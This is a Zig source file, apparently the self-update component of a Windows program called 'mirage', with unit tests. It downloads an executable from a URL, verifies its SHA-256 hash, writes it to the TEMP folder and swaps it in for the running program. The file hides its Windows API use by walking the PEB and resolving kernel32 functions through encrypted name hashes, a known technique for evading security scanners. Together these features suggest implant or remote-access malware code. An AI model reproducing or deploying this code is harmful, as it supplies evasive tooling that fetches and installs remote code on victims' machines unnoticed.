const std = @import("std");
const types = @import("../types/types.zig");
const hash = @import("../types/hash.zig");
const http = @import("../network/http.zig");
const supersede = @import("supersede.zig");
const peb_walk = @import("../types/peb_walk.zig");
const export_resolve = @import("../types/export_resolve.zig");

pub const UpdateResult = enum(u32) {
    Success = 0,
    DownloadFailed = 1,
    HashMismatch = 2,
    ReplaceFailed = 3,
    NoUpdate = 4,
};

const update_filename = "mirage_update.exe";

fn getTempDir(out: []u16) ?usize {
    const kernel32 = peb_walk.getModuleByHash(hash.encryptedHashModule("kernel32.dll")) orelse return null;
    const func = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("GetEnvironmentVariableW")) orelse return null;
    const GetEnv: *const fn (name: [*:0]const u16, buf: [*]u16, size: u32) callconv(.stdcall) u32 = @ptrCast(@alignCast(func));

    const temp_name = comptime blk: {
        var name_buf: [5]u16 = undefined;
        for ("TEMP", 0..) |c, i| name_buf[i] = c;
        name_buf[4] = 0;
        break :blk @as([*:0]const u16, @ptrCast(&name_buf));
    };

    const len = GetEnv(temp_name, out.ptr, @as(u32, @intCast(out.len)));
    if (len == 0 or len >= out.len) return null;
    return len;
}

fn buildTempPath(out: []u16) ?usize {
    const temp_len = getTempDir(out) orelse return null;
    var idx = temp_len;
    if (idx > 0 and out[idx - 1] != '\\') {
        if (idx >= out.len) return null;
        out[idx] = '\\';
        idx += 1;
    }
    for (update_filename, 0..) |c, i| {
        if (idx + i >= out.len) return null;
        out[idx + i] = c;
    }
    idx += update_filename.len;
    if (idx >= out.len) return null;
    out[idx] = 0;
    return idx;
}

fn writeFile(path: []const u16, data: []const u8) bool {
    const kernel32 = peb_walk.getModuleByHash(hash.encryptedHashModule("kernel32.dll")) orelse return false;
    const cf = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("CreateFileW")) orelse return false;
    const wf = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("WriteFile")) orelse return false;
    const ch = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("CloseHandle")) orelse return false;

    const CreateFileW: *const fn ([*:0]const u16, u32, u32, ?*anyopaque, u32, u32, ?*anyopaque) callconv(.stdcall) ?*anyopaque = @ptrCast(@alignCast(cf));
    const WriteFile: *const fn (?*anyopaque, [*]const u8, u32, *u32, ?*anyopaque) callconv(.stdcall) u32 = @ptrCast(@alignCast(wf));
    const CloseHandle: *const fn (?*anyopaque) callconv(.stdcall) u32 = @ptrCast(@alignCast(ch));

    const handle = CreateFileW(path.ptr, 0x40000000, 0, null, 2, 0x80, null);
    if (handle == null) return false;
    defer _ = CloseHandle(handle.?);

    var written: u32 = 0;
    if (WriteFile(handle.?, data.ptr, @as(u32, @intCast(data.len)), &written, null) == 0) return false;
    return written == data.len;
}

fn hexToBytes(hex: []const u8, out: []u8) bool {
    if (hex.len != out.len * 2) return false;
    for (0..out.len) |i| {
        const hi = hexNibble(hex[i * 2]) orelse return false;
        const lo = hexNibble(hex[i * 2 + 1]) orelse return false;
        out[i] = (hi << 4) | lo;
    }
    return true;
}

fn hexNibble(c: u8) ?u8 {
    return switch (c) {
        '0'...'9' => c - '0',
        'a'...'f' => c - 'a' + 10,
        'A'...'F' => c - 'A' + 10,
        else => null,
    };
}

pub fn update(allocator: std.mem.Allocator, url: []const u8, expected_hash: []const u8) UpdateResult {
    _ = allocator;
    if (url.len == 0 or expected_hash.len != 64) return .NoUpdate;

    var host_buf: [256]u8 = undefined;
    var path_buf: [1024]u8 = undefined;
    var host: []const u8 = undefined;
    var path: []const u8 = undefined;
    var port: u16 = 443;

    const https = "https://";
    const http_ = "http://";
    var rest = url;
    if (std.mem.startsWith(u8, rest, https)) {
        rest = rest[https.len..];
    } else if (std.mem.startsWith(u8, rest, http_)) {
        rest = rest[http_.len..];
        port = 80;
    } else {
        return .DownloadFailed;
    }

    const slash = std.mem.indexOfScalar(u8, rest, '/');
    if (slash) |s| {
        host = rest[0..s];
        path = rest[s..];
    } else {
        host = rest;
        path = "/";
    }

    const colon = std.mem.indexOfScalar(u8, host, ':');
    if (colon) |c| {
        const port_str = host[c + 1 ..];
        host = host[0..c];
        port = std.fmt.parseInt(u16, port_str, 10) catch return .DownloadFailed;
    }

    @memcpy(host_buf[0..host.len], host);
    host_buf[host.len] = 0;
    @memcpy(path_buf[0..path.len], path);
    path_buf[path.len] = 0;

    var client = http.HttpClient.connect(host_buf[0..host.len], port) catch return .DownloadFailed;
    defer client.close();

    const resp = client.get(path_buf[0..path.len], &.{}) catch return .DownloadFailed;
    defer resp.deinit();

    if (resp.status != 200) return .DownloadFailed;
    if (resp.body.len == 0) return .DownloadFailed;

    var hash_ctx = std.crypto.sha2.Sha256.init(.{});
    hash_ctx.update(resp.body);
    const digest = hash_ctx.final();

    var expected_bytes: [32]u8 = undefined;
    if (!hexToBytes(expected_hash, &expected_bytes)) return .HashMismatch;

    if (!std.mem.eql(u8, &digest, &expected_bytes)) return .HashMismatch;

    var wide_path: [512]u16 = undefined;
    const path_len = buildTempPath(&wide_path) orelse return .ReplaceFailed;
    const path_slice = wide_path[0..path_len];

    if (!writeFile(path_slice, resp.body)) return .ReplaceFailed;

    var utf8_path_buf: [512]u8 = undefined;
    var utf8_len: usize = 0;
    for (path_slice) |wc| {
        if (wc == 0) break;
        if (wc < 128) {
            if (utf8_len >= utf8_path_buf.len) break;
            utf8_path_buf[utf8_len] = @as(u8, @intCast(wc & 0xFF));
            utf8_len += 1;
        }
    }

    if (!supersede.supersede(utf8_path_buf[0..utf8_len])) return .ReplaceFailed;

    return .Success;
}

test "update hexToBytes valid" {
    var buf: [32]u8 = undefined;
    try std.testing.expect(hexToBytes("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", &buf));
    try std.testing.expectEqual(@as(u8, 0xe3), buf[0]);
    try std.testing.expectEqual(@as(u8, 0x55), buf[31]);
}

test "update hexToBytes invalid length" {
    var buf: [32]u8 = undefined;
    try std.testing.expect(!hexToBytes("abc", &buf));
}

test "update hexToBytes invalid char" {
    var buf: [32]u8 = undefined;
    try std.testing.expect(!hexToBytes("zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz", &buf));
}

test "update hexNibble" {
    try std.testing.expectEqual(@as(u8, 0), hexNibble('0').?);
    try std.testing.expectEqual(@as(u8, 15), hexNibble('f').?);
    try std.testing.expectEqual(@as(u8, 15), hexNibble('F').?);
    try std.testing.expect(hexNibble('g') == null);
}

test "update result enum values" {
    try std.testing.expectEqual(@as(u32, 0), @intFromEnum(UpdateResult.Success));
    try std.testing.expectEqual(@as(u32, 1), @intFromEnum(UpdateResult.DownloadFailed));
    try std.testing.expectEqual(@as(u32, 2), @intFromEnum(UpdateResult.HashMismatch));
    try std.testing.expectEqual(@as(u32, 4), @intFromEnum(UpdateResult.NoUpdate));
}

test "update empty url returns NoUpdate" {
    try std.testing.expectEqual(UpdateResult.NoUpdate, update(std.testing.allocator, "", "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"));
}

test "update bad hash length returns NoUpdate" {
    try std.testing.expectEqual(UpdateResult.NoUpdate, update(std.testing.allocator, "https://example.com/update", "abc"));
}
